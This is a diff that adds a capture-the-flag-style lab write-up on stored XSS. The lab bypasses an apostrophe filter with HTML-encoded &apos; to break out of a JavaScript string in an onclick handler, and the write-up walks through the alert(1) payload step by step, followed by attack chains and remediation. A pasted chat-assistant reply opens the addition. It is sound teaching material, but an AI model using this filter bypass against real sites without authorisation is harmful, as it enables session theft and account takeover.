@@ -8737,3 +8737,388 @@ At expert level:
 👉 You are abusing JavaScript logic itself  
 
 ---
+
+Got it — I included your missing decoded-payload step, kept everything structured, and added 1 screenshot (final encoded payload) right after the walkthrough.
+
+✔ Clean markdown UI
+✔ No merging
+✔ Quotes / payloads preserved
+✔ Step added correctly
+
+
+---
+
+---
+
+# 🐞Lab-22 Stored XSS - HTML Encoding inside onclick (Attribute → JS String)
+
+---
+
+## 🔹 Overview
+
+Stored Cross-Site Scripting (Stored XSS) occurs when:
+
+✔ User input is saved on the server  
+✔ Later rendered into the page  
+✔ Browser interprets it as executable code  
+
+---
+
+👉 In this lab:
+
+Input is placed inside:
+
+HTML → attribute (onclick) → JavaScript → string  
+
+---
+
+👉 Important behavior:
+
+❌ ' is filtered  
+✔ Encoded version works  
+
+---
+
+## 🧠 What Is This Topic?
+
+Bypassing filters using **HTML encoding**
+
+---
+
+## 🔹 Context Structure
+
+```
+<a href="USER_INPUT"
+   onclick="tracker.track('USER_INPUT');">
+```
+
+---
+
+👉 Input is inside:
+
+JavaScript string → `'INPUT'`
+
+---
+
+## 🪜 Lab Walkthrough
+
+---
+
+### 1️⃣ Initial Test (Normal Input)
+
+Website:
+
+```
+http://fsociety.com
+```
+
+---
+
+### 2️⃣ Observe Reflection
+
+```
+href="http://fsociety.com"
+onclick="tracker.track('http://fsociety.com');"
+```
+
+---
+
+👉 Understanding:
+
+✔ `href` → display only  
+⚠️ `onclick` → execution point  
+
+---
+
+### 3️⃣ Identify Context
+
+```
+tracker.track('YOUR_INPUT');
+```
+
+✔ JavaScript string context  
+
+---
+
+### 4️⃣ Try Normal Payload (Fails)
+
+```
+http://foo?'-alert(1)-'
+```
+
+---
+
+❌ Result:
+
+- Server blocks `'`
+- String does NOT break  
+
+---
+
+### 5️⃣ Decoded Payload (What We WANT)
+
+```
+http://foo?'-alert(1)-'
+```
+
+---
+
+👉 This is the **logical payload**, but it fails due to filtering  
+
+---
+
+### 6️⃣ Encode Payload (Bypass)
+
+```
+http://foo?&apos;-alert(1)-&apos;
+```
+
+---
+
+👉 Why it works:
+
+✔ Server allows `&apos;`  
+✔ Browser converts it → `'`  
+
+---
+
+### 7️⃣ Submit Final Payload
+
+Website field:
+
+```
+http://foo?&apos;-alert(1)-&apos;
+```
+
+---
+
+### 8️⃣ Server Response
+
+```
+onclick="tracker.track('http://foo?&apos;-alert(1)-&apos;');"
+```
+
+---
+
+### 9️⃣ Browser Decodes
+
+```
+tracker.track('http://foo?' - alert(1) - '');
+```
+
+---
+
+### 🔟 Trigger Execution
+
+Click:
+
+- Author name  
+- Back to blog  
+
+---
+
+💥 Result:
+
+```
+alert(1)
+```
+
+✅ Lab Solved  
+
+---
+
+## 📸 Screenshot — Final Encoded Payload
+
+![final-encoded-payload](../images/html-final-encoded-payload.png)
+
+---
+
+## 🔍 Payload Breakdown
+
+---
+
+### 🔴 Final Payload (Encoded)
+
+```
+http://foo?&apos;-alert(1)-&apos;
+```
+
+---
+
+### 🟡 Decoded Version (Browser Sees)
+
+```
+http://foo?'-alert(1)-'
+```
+
+---
+
+## 🧩 Step-by-Step Execution
+
+---
+
+### 🔹 1️⃣ &apos;
+
+→ becomes `'`  
+
+✔ Closes JS string  
+
+---
+
+### 🔹 2️⃣ -alert(1)-
+
+✔ Executes JavaScript  
+
+---
+
+### 🔹 3️⃣ &apos;
+
+→ becomes `'`  
+
+✔ Repairs syntax  
+
+---
+
+## 🧠 Final JavaScript
+
+```
+tracker.track('http://foo?' - alert(1) - '');
+```
+
+---
+
+💥 Alert executes  
+
+---
+
+## 🔹 Why It Appears in href
+
+```
+href="http://foo?... "
+```
+
+---
+
+✔ Just a normal link  
+❌ Not execution point  
+
+---
+
+## 🔹 Why It Executes on Click
+
+```
+onclick="..."
+```
+
+---
+
+✔ Executes when user clicks  
+
+---
+
+## 🌍 Real-World Scenarios
+
+---
+
+### 🟢 Comment Systems
+
+```
+<a onclick="track('INPUT')">
+```
+
+---
+
+### 🟢 Analytics Tracking
+
+```
+onclick="sendData('INPUT')"
+```
+
+---
+
+### 🟢 Profile Website Fields
+
+```
+href="USER_URL"
+onclick="track('USER_URL')"
+```
+
+---
+
+### 🟢 Button Tracking
+
+```
+<button onclick="log('INPUT')">
+```
+
+---
+
+### 🟢 Marketing / CRM Tools
+
+```
+onclick="openLink('INPUT')"
+```
+
+---
+
+## 🔗 Attack Chains
+
+---
+
+🔥 Stored XSS → Mass execution  
+
+🔥 XSS → Admin takeover  
+
+🔥 XSS → Data theft  
+
+🔥 XSS → Phishing  
+
+---
+
+## 🛡️ Remediation
+
+---
+
+✔ Escape for JavaScript context  
+✔ Avoid inline JS (`onclick`)  
+✔ Use `addEventListener`  
+✔ Use CSP  
+✔ Proper encoding  
+
+---
+
+## 🧠 Pro Hunter Mindset
+
+---
+
+👉 If character is blocked → encode it  
+
+✔ Browser will decode it later  
+
+---
+
+## 🧠 Ultimate Mental Model
+
+---
+
+Input  
+↓  
+Stored  
+↓  
+Reflected in onclick  
+↓  
+Browser decodes  
+↓  
+JS string breaks  
+↓  
+Click triggers execution  
+
+---
+
+## 🎯 Final One-Liner
+
+---
+
+Bypass filters using **HTML encoding** to break JavaScript inside attributes  
+
+---
